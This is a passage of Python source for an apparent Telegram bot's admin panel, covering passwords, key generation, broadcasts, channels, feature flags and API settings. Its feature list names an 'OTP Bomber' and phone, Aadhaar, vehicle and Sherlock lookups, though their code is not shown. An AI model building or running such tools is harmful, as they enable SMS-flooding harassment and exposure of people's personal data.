        f"Current password: <code>{'*' * len(BOT_PASSWORD)}</code>\n"
        f"Length: {len(BOT_PASSWORD)} characters\n\n"
        f"📝 Send new password as text message.\n\n"
        f"⚠️ Rules:\n"
        f"• Minimum 4 characters\n"
        f"• Can include spaces/symbols\n"
        f"• Existing users stay authenticated\n\n"
        f"Type /cancel to cancel.",
        parse_mode='HTML'
    )

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "change_password" and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def process_change_password(m):
    global BOT_PASSWORD
    uid = m.from_user.id
    new_password = m.text.strip()
    
    if new_password == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Password change cancelled.")
        return
    
    if len(new_password) < 4:
        bot.reply_to(m, "❌ <b>Password too short!</b>\n\nMinimum 4 characters required.", parse_mode='HTML')
        return
    
    if len(new_password) > 100:
        bot.reply_to(m, "❌ <b>Password too long!</b>\n\nMaximum 100 characters allowed.", parse_mode='HTML')
        return
    
    old_password = BOT_PASSWORD
    BOT_PASSWORD = new_password
    
    settings_db['bot_password'] = new_password
    save_database(SETTINGS_DB_FILE, settings_db)
    
    if uid in action_sessions:
        del action_sessions[uid]
    
    bot.reply_to(
        m,
        f"✅ <b>PASSWORD CHANGED!</b>\n\n"
        f"🔐 Old length: {len(old_password)}\n"
        f"🆕 New: <code>{new_password}</code>\n\n"
        f"⚠️ <b>Important:</b>\n"
        f"• Share this with new users\n"
        f"• Already-authenticated users stay in\n"
        f"• New users will need this password\n"
        f"• Password saved in database",
        parse_mode='HTML'
    )
    
    log_to_group(
        f"🔑 PASSWORD CHANGED\n"
        f"👑 Owner: {m.from_user.first_name}\n"
        f"🔐 Old length: {len(old_password)}\n"
        f"🆕 New length: {len(new_password)}\n"
        f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )

# ==========================================
# 🔴 BOT ON/OFF TOGGLE
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_bot_toggle" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def bot_toggle_menu(c):
    status = "🟢 ONLINE" if BOT_ENABLED else "🔴 OFFLINE"
    action_text = "Turn OFF" if BOT_ENABLED else "Turn ON"
    
    mk = types.InlineKeyboardMarkup(row_width=1)
    mk.add(
        types.InlineKeyboardButton(
            f"{'🔴' if BOT_ENABLED else '🟢'} {action_text} Bot",
            callback_data="bot_toggle_confirm"
        )
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text(
        f"🔴 <b>BOT STATUS CONTROL</b>\n\n"
        f"Current Status: {status}\n\n"
        f"<b>What happens when OFF:</b>\n"
        f"• ❌ Users cannot use bot\n"
        f"• ❌ All features blocked\n"
        f"• ❌ Commands not processed\n"
        f"• ✅ Owner still has access\n"
        f"• ✅ Existing processes keep running\n\n"
        f"<b>Use case:</b> Maintenance, emergency stop, updates\n\n"
        f"Select action:",
        c.message.chat.id, c.message.message_id,
        reply_markup=mk, parse_mode='HTML'
    )

@bot.callback_query_handler(func=lambda c: c.data == "bot_toggle_confirm" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def bot_toggle_confirm(c):
    global BOT_ENABLED
    
    BOT_ENABLED = not BOT_ENABLED
    
    settings_db['bot_enabled'] = BOT_ENABLED
    save_database(SETTINGS_DB_FILE, settings_db)
    
    if BOT_ENABLED:
        bot.answer_callback_query(c.id, "🟢 Bot turned ON!", show_alert=True)
        bot.edit_message_text(
            f"✅ <b>BOT IS NOW ONLINE</b>\n\n"
            f"🟢 All users can use bot again.\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Use /start to return to owner panel.",
            c.message.chat.id, c.message.message_id,
            parse_mode='HTML'
        )
        log_to_group(f"🟢 BOT TURNED ON\n👑 {c.from_user.first_name}\n🕒 {datetime.now().strftime('%H:%M:%S')}")
        try:
            bot.send_message(ADMIN_ID, "🟢 <b>Bot is now ONLINE</b>\n\nAll users can use bot again.", parse_mode='HTML')
        except:
            pass
    else:
        bot.answer_callback_query(c.id, "🔴 Bot turned OFF!", show_alert=True)
        bot.edit_message_text(
            f"🔴 <b>BOT IS NOW OFFLINE</b>\n\n"
            f"❌ All users blocked.\n"
            f"✅ You (owner) still have access.\n"
            f"🕒 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n\n"
            f"Click the button again to turn ON.",
            reply_markup=types.InlineKeyboardMarkup().add(
                types.InlineKeyboardButton("🟢 Turn ON Bot", callback_data="bot_toggle_confirm")
            ),
            parse_mode='HTML'
        )
        log_to_group(f"🔴 BOT TURNED OFF\n👑 {c.from_user.first_name}\n🕒 {datetime.now().strftime('%H:%M:%S')}")
        try:
            bot.send_message(ADMIN_ID, "🔴 <b>Bot is now OFFLINE</b>\n\nAll users are blocked.\nYou still have access.", parse_mode='HTML')
        except:
            pass

# ==========================================
# 🔑 GEN KEY
# ==========================================
@bot.callback_query_handler(func=lambda c: c.data == "op_gen_key" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def op_gen_key(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🎫 Premium", callback_data="op_gen_prem"),
        types.InlineKeyboardButton("💰 Credit", callback_data="op_gen_cred")
    )
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    bot.edit_message_text("🔑 <b>Generate Key</b>\n\nSelect type:", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_gen_prem" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def gen_premium_key(c):
    action_sessions[c.from_user.id] = "gen_prem_key"
    bot.send_message(c.message.chat.id, "🎫 Enter number of days:")

@bot.callback_query_handler(func=lambda c: c.data == "op_gen_cred" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def gen_credit_key(c):
    action_sessions[c.from_user.id] = "gen_cred_key"
    bot.send_message(c.message.chat.id, "💰 Enter number of credits:")

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["gen_prem_key", "gen_cred_key"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def generate_key(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    if not text.isdigit():
        bot.reply_to(m, "❌ Invalid number")
        if uid in action_sessions:
            del action_sessions[uid]
        return
    
    value = int(text)
    
    if action == "gen_prem_key":
        key_type = "PREM"
        key_code = f"KING-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        msg = f"🎫 <b>Premium Key</b>\n\n🔑 <code>{key_code}</code>\n⏰ {value} days"
    else:
        key_type = "CREDIT"
        key_code = f"CRED-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}-{random.randint(1000, 9999)}"
        msg = f"💰 <b>Credit Key</b>\n\n🔑 <code>{key_code}</code>\n💎 {value} credits"
    
    keys_db[key_code] = {
        'type': key_type,
        'value': value,
        'generated_by': ADMIN_ID,
        'generated_date': datetime.now().strftime("%Y-%m-%d"),
        'used': False
    }
    save_database(KEYS_DB_FILE, keys_db)
    
    bot.reply_to(m, msg, parse_mode='HTML')
    log_to_group(f"🔑 KEY GENERATED\n👑 {m.from_user.first_name}\n🔑 {key_code}\n📊 {key_type}\n💎 {value}")
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_stats" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def show_stats_callback(c):
    total_users = len(users_db)
    total_premium = sum(1 for uid_str in users_db if is_premium(int(uid_str)))
    total_files = len(files_db)
    total_banned = len([uid for uid, ban in bans_db.items() if datetime.fromisoformat(ban['expiry']) > datetime.now()])
    public_channels = get_channel_count_by_type("public")
    private_channels = get_channel_count_by_type("private")
    total_keys = len([k for k, v in keys_db.items() if not v.get('used', False)])
    total_credits = sum(user.get('credits', 0) for user in users_db.values())
    total_points = sum(user.get('referral_points', 0) for user in users_db.values())
    total_refs = sum(user.get('total_referrals', 0) for user in users_db.values())
    active_processes = sum(len(procs) for procs in running_processes.values())
    total_temp_mails = len(temp_mails_db)
    enabled_features = sum(1 for feature, enabled in settings_db.get('feature_flags', {}).items() if enabled)
    total_features = len(settings_db.get('feature_flags', {}))
    
    bot_status = "🟢 ONLINE" if BOT_ENABLED else "🔴 OFFLINE"
    
    stats_text = (
        "📊 <b>BOT STATISTICS</b>\n"
        "══════════════════════════════\n\n"
        f"🤖 <b>Bot Status:</b> {bot_status}\n"
        f"👥 <b>Total Users:</b> {total_users}\n"
        f"👑 <b>Premium:</b> {total_premium}\n"
        f"📁 <b>Files:</b> {total_files}\n"
        f"🚫 <b>Banned:</b> {total_banned}\n"
        f"📢 <b>Channels:</b> {public_channels + private_channels}\n"
        f"🔑 <b>Active Keys:</b> {total_keys}\n"
        f"💰 <b>Credits:</b> {total_credits}\n"
        f"⭐ <b>Points:</b> {total_points}\n"
        f"🤝 <b>Referrals:</b> {total_refs}\n"
        f"⚡ <b>Processes:</b> {active_processes}\n"
        f"📧 <b>Temp Mails:</b> {total_temp_mails}\n"
        f"🔧 <b>Features:</b> {enabled_features}/{total_features}\n\n"
        f"📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
    )
    
    bot.send_message(c.message.chat.id, stats_text, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_broadcast" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def broadcast_menu(c):
    action_sessions[c.from_user.id] = "broadcast"
    bot.send_message(c.message.chat.id, "📢 <b>Broadcast</b>\n\nSend message to broadcast.\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "broadcast" and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def broadcast_message(m):
    uid = m.from_user.id
    
    if m.text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.")
        return
    
    msg = bot.reply_to(m, "📢 <b>Broadcasting...</b>", parse_mode='HTML')
    
    total_users = len(users_db)
    sent = 0
    failed = 0
    
    def send_broadcast():
        nonlocal sent, failed
        for user_id_str in users_db:
            try:
                user_id = int(user_id_str)
                if is_banned(user_id)[0]:
                    continue
                
                if m.content_type == 'text':
                    bot.send_message(user_id, m.text, parse_mode='HTML')
                elif m.content_type == 'photo':
                    bot.send_photo(user_id, m.photo[-1].file_id, caption=m.caption, parse_mode='HTML')
                elif m.content_type == 'document':
                    bot.send_document(user_id, m.document.file_id, caption=m.caption, parse_mode='HTML')
                
                sent += 1
                time.sleep(0.05)
            except:
                failed += 1
        
        result_text = f"✅ <b>Broadcast Done!</b>\n\n👥 Total: {total_users}\n✅ Sent: {sent}\n❌ Failed: {failed}"
        bot.edit_message_text(result_text, m.chat.id, msg.message_id, parse_mode='HTML')
        log_to_group(f"📢 BROADCAST\n👑 {m.from_user.first_name}\n👥 {total_users}\n✅ {sent}\n❌ {failed}")
    
    threading.Thread(target=send_broadcast, daemon=True).start()
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_requirements" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def requirements_menu(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("📦 Upload Req", callback_data="op_upload_req"),
        types.InlineKeyboardButton("🔧 Update", callback_data="op_update_modules")
    )
    mk.add(types.InlineKeyboardButton("📋 View", callback_data="op_view_req"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    bot.edit_message_text("📦 <b>Requirements</b>", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "op_upload_req" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def upload_req(c):
    action_sessions[c.from_user.id] = "upload_req"
    bot.send_message(c.message.chat.id, "📦 <b>Upload Requirements</b>\n\nSend requirements.txt file.\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) == "upload_req" and m.from_user.id == ADMIN_ID, content_types=['document'])
@rate_limit_and_ban_check
def handle_requirements_file(m):
    uid = m.from_user.id
    
    if not m.document or not m.document.file_name.endswith('.txt'):
        bot.reply_to(m, "❌ Send a .txt file")
        return
    
    try:
        file_info = bot.get_file(m.document.file_id)
        downloaded_file = bot.download_file(file_info.file_path)
        
        global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
        with open(global_req_path, 'wb') as f:
            f.write(downloaded_file)
        
        load_global_requirements()
        
        with open(global_req_path, 'r') as f:
            modules = [line.strip() for line in f if line.strip()]
        
        bot.reply_to(m, f"✅ <b>Updated!</b>\n\n📄 {m.document.file_name}\n📦 {len(modules)} modules", parse_mode='HTML')
        log_to_group(f"📦 REQUIREMENTS UPDATED\n👑 {m.from_user.first_name}\n📦 {len(modules)}")
    except Exception as e:
        bot.reply_to(m, f"❌ {e}")
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_update_modules" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def update_modules(c):
    bot.answer_callback_query(c.id, "🔧 Updating...")
    try:
        subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', 'pip'], capture_output=True)
        modules = ['telebot', 'paramiko', 'psutil', 'instaloader', 'yt-dlp', 'requests', 'aiohttp', 'colorama', 'beautifulsoup4']
        for module in modules:
            try:
                subprocess.run([sys.executable, '-m', 'pip', 'install', '--upgrade', module], capture_output=True)
            except:
                pass
        bot.send_message(c.message.chat.id, "✅ <b>Modules Updated!</b>", parse_mode='HTML')
        log_to_group(f"🔧 MODULES UPDATED\n👑 {c.from_user.first_name}")
    except Exception as e:
        bot.send_message(c.message.chat.id, f"❌ {e}")

@bot.callback_query_handler(func=lambda c: c.data == "op_view_req" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def view_requirements(c):
    global_req_path = os.path.join(BASE_DIR, 'global_requirements.txt')
    if os.path.exists(global_req_path):
        with open(global_req_path, 'r') as f:
            content = f.read()
        if len(content) > 4000:
            with open(global_req_path, 'rb') as f:
                bot.send_document(c.message.chat.id, f, caption="📦 Requirements", parse_mode='HTML')
        else:
            bot.send_message(c.message.chat.id, f"📦 <b>Requirements</b>\n\n<code>{content}</code>", parse_mode='HTML')
    else:
        bot.answer_callback_query(c.id, "❌ Not found", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "op_channel_mgmt" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def channel_management_menu(c):
    public_count = get_channel_count_by_type("public")
    private_count = get_channel_count_by_type("private")
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("➕ Add Public", callback_data="cm_add_public"),
        types.InlineKeyboardButton("➕ Add Private", callback_data="cm_add_private")
    )
    mk.add(
        types.InlineKeyboardButton("➖ Remove", callback_data="cm_remove"),
        types.InlineKeyboardButton("📋 List", callback_data="cm_list")
    )
    mk.add(
        types.InlineKeyboardButton("🔄 Update All", callback_data="cm_update_all"),
        types.InlineKeyboardButton("🔙 Back", callback_data="op_back")
    )
    
    status_text = f"📊 <b>Channels:</b>\n• Public: {public_count}/{MAX_PUBLIC_CHANNELS}\n• Private: {private_count}/{MAX_PRIVATE_CHANNELS}"
    
    bot.edit_message_text(f"📢 <b>Channel Management</b>\n\n{status_text}", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("cm_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def channel_management_handler(c):
    uid = c.from_user.id
    action = c.data[3:]
    
    if action == "add_public":
        public_count = get_channel_count_by_type("public")
        if public_count >= MAX_PUBLIC_CHANNELS:
            bot.answer_callback_query(c.id, f"❌ Max {MAX_PUBLIC_CHANNELS}!", show_alert=True)
            return
        action_sessions[uid] = "add_channel_public"
        bot.send_message(c.message.chat.id, "➕ <b>Add Public Channel</b>\n\nSend:\n<code>@channel_username https://t.me/channel_username</code>\n\nType /cancel to cancel.", parse_mode='HTML')
    
    elif action == "add_private":
        private_count = get_channel_count_by_type("private")
        if private_count >= MAX_PRIVATE_CHANNELS:
            bot.answer_callback_query(c.id, f"❌ Max {MAX_PRIVATE_CHANNELS}!", show_alert=True)
            return
        action_sessions[uid] = "add_channel_private"
        bot.send_message(c.message.chat.id, "➕ <b>Add Private Channel</b>\n\nSend:\n<code>@private_channel https://t.me/private_channel</code>\n\nType /cancel to cancel.", parse_mode='HTML')
    
    elif action == "remove":
        action_sessions[uid] = "remove_channel"
        list_channels_for_removal(c.message)
    
    elif action == "list":
        list_all_channels(c.message)
    
    elif action == "update_all":
        update_all_channels(c.message)
    
    elif action == "back":
        bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id) in ["add_channel_public", "add_channel_private"] and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def add_channel_process(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    text = m.text.strip()
    
    if text == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.")
        return
    
    try:
        parts = text.split()
        if len(parts) < 2:
            raise ValueError
        
        channel_username = parts[0]
        channel_link = parts[1]
        
        if not channel_username.startswith('@'):
            channel_username = '@' + channel_username
        
        if not channel_link.startswith('https://t.me/'):
            raise ValueError("Link must start with https://t.me/")
        
        channel_type = "public" if action == "add_channel_public" else "private"
        
        for channel in force_channels:
            if channel['channel_username'] == channel_username:
                bot.reply_to(m, f"❌ {channel_username} already exists!")
                if uid in action_sessions:
                    del action_sessions[uid]
                return
        
        count = get_channel_count_by_type(channel_type)
        max_limit = MAX_PUBLIC_CHANNELS if channel_type == "public" else MAX_PRIVATE_CHANNELS
        
        if count >= max_limit:
            bot.reply_to(m, f"❌ Max {max_limit} reached!")
            if uid in action_sessions:
                del action_sessions[uid]
            return
        
        new_channel = {
            "channel_username": channel_username,
            "channel_link": channel_link,
            "channel_type": channel_type,
            "added_by": uid,
            "added_date": datetime.now().strftime("%Y-%m-%d")
        }
        force_channels.append(new_channel)
        save_database(FORCE_CHANNELS_FILE, force_channels)
        
        bot.reply_to(m, f"✅ <b>Added!</b>\n\n📢 {channel_username}\n🔗 {channel_link}\n📊 {channel_type}", parse_mode='HTML')
        log_to_group(f"📢 CHANNEL ADDED\n👑 {m.from_user.first_name}\n📢 {channel_username}\n📊 {channel_type}")
    except Exception as e:
        bot.reply_to(m, f"❌ Error: {e}\n\nFormat: @channel https://t.me/channel")
    finally:
        if uid in action_sessions:
            del action_sessions[uid]

def list_channels_for_removal(m):
    if not force_channels:
        bot.reply_to(m, "📭 No channels found.", parse_mode='HTML')
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    for channel in force_channels:
        channel_username = channel['channel_username']
        channel_type = channel['channel_type']
        emoji = "🔒" if channel_type == "private" else "📢"
        mk.add(types.InlineKeyboardButton(f"{emoji} {channel_username}", callback_data=f"cmrem_{channel_username}"))
    
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="cm_cancel"))
    bot.reply_to(m, "🗑 <b>Select Channel to Remove:</b>", reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("cmrem_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def remove_channel_handler(c):
    uid = c.from_user.id
    channel_username = c.data.split("cmrem_")[1]
    
    global force_channels
    force_channels = [ch for ch in force_channels if ch['channel_username'] != channel_username]
    save_database(FORCE_CHANNELS_FILE, force_channels)
    
    for user_id in list(user_channels.keys()):
        if channel_username in user_channels[user_id]:
            user_channels[user_id].remove(channel_username)
    
    bot.answer_callback_query(c.id, f"🗑 {channel_username} removed!")
    bot.delete_message(c.message.chat.id, c.message.message_id)
    
    if uid in action_sessions:
        del action_sessions[uid]
    
    log_to_group(f"🗑 CHANNEL REMOVED\n👑 {c.from_user.first_name}\n📢 {channel_username}")

def list_all_channels(m):
    if not force_channels:
        bot.reply_to(m, "📭 No channels configured.", parse_mode='HTML')
        return
    
    public_channels = [ch for ch in force_channels if ch['channel_type'] == "public"]
    private_channels = [ch for ch in force_channels if ch['channel_type'] == "private"]
    
    response = "📢 <b>Force Channels</b>\n\n"
    
    if public_channels:
        response += "<b>Public:</b>\n"
        for i, ch in enumerate(public_channels, 1):
            response += f"{i}. {ch['channel_username']}\n   🔗 {ch['channel_link']}\n"
        response += "\n"
    
    if private_channels:
        response += "<b>Private:</b>\n"
        for i, ch in enumerate(private_channels, 1):
            response += f"{i}. {ch['channel_username']}\n   🔗 {ch['channel_link']}\n"
    
    bot.reply_to(m, response, parse_mode='HTML')

def update_all_channels(m):
    bot.reply_to(m, "🔄 <b>Updating...</b>", parse_mode='HTML')
    
    updated = 0
    failed = 0
    
    for user_id_str in list(users_db.keys()):
        try:
            user_id = int(user_id_str)
            if user_id == ADMIN_ID:
                continue
            joined, _ = check_all_channels_join(user_id)
            if joined:
                verify_referral(user_id)
                updated += 1
        except:
            failed += 1
    
    bot.reply_to(m, f"✅ <b>Update Complete!</b>\n\n🔄 {updated} users\n❌ {failed} failed", parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data == "cm_cancel" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def channel_cancel(c):
    uid = c.from_user.id
    if uid in action_sessions:
        del action_sessions[uid]
    bot.answer_callback_query(c.id, "❌ Cancelled")
    bot.delete_message(c.message.chat.id, c.message.message_id)

@bot.callback_query_handler(func=lambda c: c.data == "op_delete_key" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def delete_key_menu(c):
    unused_keys = {k: v for k, v in keys_db.items() if not v.get('used', False)}
    
    if not unused_keys:
        bot.answer_callback_query(c.id, "❌ No unused keys", show_alert=True)
        return
    
    mk = types.InlineKeyboardMarkup(row_width=2)
    for key_code, key_data in list(unused_keys.items())[:20]:
        key_type = "🎫" if key_data['type'] == "PREM" else "💰"
        mk.add(types.InlineKeyboardButton(f"{key_type} {key_code}", callback_data=f"delkey_{key_code}"))
    
    mk.add(types.InlineKeyboardButton("❌ Cancel", callback_data="op_back"))
    
    bot.edit_message_text("🗑 <b>Select Key:</b>", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("delkey_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def delete_key_handler(c):
    key_code = c.data.split("delkey_")[1]
    
    if key_code in keys_db:
        del keys_db[key_code]
        save_database(KEYS_DB_FILE, keys_db)
        bot.answer_callback_query(c.id, f"🗑 {key_code} deleted!")
        bot.delete_message(c.message.chat.id, c.message.message_id)
        log_to_group(f"🗑 KEY DELETED\n👑 {c.from_user.first_name}\n🔑 {key_code}")
    else:
        bot.answer_callback_query(c.id, "❌ Not found", show_alert=True)

@bot.callback_query_handler(func=lambda c: c.data == "op_update_all" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def update_all(c):
    bot.answer_callback_query(c.id, "🔄 Updating...")
    save_all_databases()
    load_global_requirements()
    bot.send_message(c.message.chat.id, f"✅ <b>Updated!</b>\n\n{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}", parse_mode='HTML')
    log_to_group(f"🔄 ALL UPDATED\n👑 {c.from_user.first_name}")

@bot.callback_query_handler(func=lambda c: c.data == "op_feature_control" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def feature_control_menu(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    feature_flags = settings_db.get('feature_flags', FEATURE_FLAGS.copy())
    
    features = [
        ("c_to_binary", "🔧 C to Binary"),
        ("file_hosting", "📁 File Hosting"),
        ("number_lookup", "📞 Number Lookup"),
        ("aadhaar_lookup", "🔍 Aadhaar Info"),
        ("vehicle_lookup", "🚗 Vehicle Lookup"),
        ("sherlock_lookup", "🕵️ Sherlock Lookup"),
        ("otp_bomber", "💣 OTP Bomber"),
        ("temp_mail", "📧 Temp Mail"),
        ("install_pips", "🔧 Install Pips")
    ]
    
    for feature_key, display_name in features:
        status = "✅" if feature_flags.get(feature_key, True) else "❌"
        mk.add(types.InlineKeyboardButton(f"{status} {display_name}", callback_data=f"fc_toggle_{feature_key}"))
    
    mk.add(types.InlineKeyboardButton("🔄 Enable All", callback_data="fc_enable_all"))
    mk.add(types.InlineKeyboardButton("🚫 Disable All", callback_data="fc_disable_all"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text("🔧 <b>Feature Control</b>\n\nClick to toggle:", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("fc_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def feature_control_handler(c):
    action = c.data[3:]
    
    if action == "enable_all":
        feature_flags = settings_db.get('feature_flags', {})
        for feature in FEATURE_FLAGS:
            feature_flags[feature] = True
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        bot.answer_callback_query(c.id, "✅ All enabled!")
        feature_control_menu(c)
        log_to_group(f"🔧 ALL ENABLED\n👑 {c.from_user.first_name}")
    
    elif action == "disable_all":
        feature_flags = settings_db.get('feature_flags', {})
        for feature in FEATURE_FLAGS:
            feature_flags[feature] = False
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        bot.answer_callback_query(c.id, "🚫 All disabled!")
        feature_control_menu(c)
        log_to_group(f"🔧 ALL DISABLED\n👑 {c.from_user.first_name}")
    
    elif action.startswith("toggle_"):
        feature_key = action[7:]
        feature_flags = settings_db.get('feature_flags', FEATURE_FLAGS.copy())
        current_state = feature_flags.get(feature_key, True)
        feature_flags[feature_key] = not current_state
        settings_db['feature_flags'] = feature_flags
        save_database(SETTINGS_DB_FILE, settings_db)
        
        new_state = "ENABLED" if feature_flags[feature_key] else "DISABLED"
        bot.answer_callback_query(c.id, f"✅ {feature_key}: {new_state}")
        log_to_group(f"🔧 FEATURE TOGGLED\n👑 {c.from_user.first_name}\n🔧 {feature_key}\n📊 {new_state}")
        feature_control_menu(c)

@bot.callback_query_handler(func=lambda c: c.data == "op_api_management" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def api_management_menu(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    current_apis = apis_db.copy()
    
    apis_list = [
        ("NUMBER_API", "📞 Number API"),
        ("AADHAAR_API", "🔍 Aadhaar API"),
        ("VEHICLE_API", "🚗 Vehicle API"),
        ("SHERLOCK_API", "🕵️ Sherlock API")
    ]
    
    for api_key, display_name in apis_list:
        mk.add(types.InlineKeyboardButton(display_name, callback_data=f"api_edit_{api_key}"))
    
    mk.add(types.InlineKeyboardButton("📋 View All", callback_data="api_view_all"))
    mk.add(types.InlineKeyboardButton("🔄 Reset Default", callback_data="api_reset_default"))
    mk.add(types.InlineKeyboardButton("🔙 Back", callback_data="op_back"))
    
    bot.edit_message_text("🌐 <b>API Management</b>\n\nSelect API:", c.message.chat.id, c.message.message_id, reply_markup=mk, parse_mode='HTML')

@bot.callback_query_handler(func=lambda c: c.data.startswith("api_") and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def api_management_handler(c):
    action = c.data[4:]
    
    if action == "view_all":
        api_text = "🌐 <b>Current APIs</b>\n\n"
        for api_key, api_url in apis_db.items():
            api_text += f"<b>{api_key}:</b>\n<code>{api_url}</code>\n\n"
        bot.send_message(c.message.chat.id, api_text, parse_mode='HTML')
        bot.answer_callback_query(c.id)
    
    elif action == "reset_default":
        apis_db.clear()
        apis_db.update(APIS.copy())
        save_database(APIS_DB_FILE, apis_db)
        bot.answer_callback_query(c.id, "✅ APIs reset!")
        api_management_menu(c)
        log_to_group(f"🌐 APIs RESET\n👑 {c.from_user.first_name}")
    
    elif action.startswith("edit_"):
        api_key = action[5:]
        action_sessions[c.from_user.id] = f"edit_api_{api_key}"
        current_url = apis_db.get(api_key, "")
        bot.send_message(c.message.chat.id, f"🌐 <b>Edit {api_key}</b>\n\nCurrent: <code>{current_url}</code>\n\nSend new URL:\n\nType /cancel to cancel.", parse_mode='HTML')

@bot.message_handler(func=lambda m: action_sessions.get(m.from_user.id, "").startswith("edit_api_") and m.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check
def edit_api_process(m):
    uid = m.from_user.id
    action = action_sessions[uid]
    api_key = action[9:]
    new_url = m.text.strip()
    
    if new_url == '/cancel':
        if uid in action_sessions:
            del action_sessions[uid]
        bot.reply_to(m, "❌ Cancelled.")
        return
    
    apis_db[api_key] = new_url
    save_database(APIS_DB_FILE, apis_db)
    
    bot.reply_to(m, f"✅ <b>API Updated!</b>\n\n🔑 {api_key}\n🌐 <code>{new_url}</code>", parse_mode='HTML')
    log_to_group(f"🌐 API UPDATED\n👑 {m.from_user.first_name}\n🔑 {api_key}\n🌐 {new_url}")
    
    if uid in action_sessions:
        del action_sessions[uid]

@bot.callback_query_handler(func=lambda c: c.data == "op_user_mgmt" and c.from_user.id == ADMIN_ID)
@rate_limit_and_ban_check_cb
def user_management_menu(c):
    mk = types.InlineKeyboardMarkup(row_width=2)
    mk.add(
        types.InlineKeyboardButton("🚫 Ban", callback_data="um_ban"),
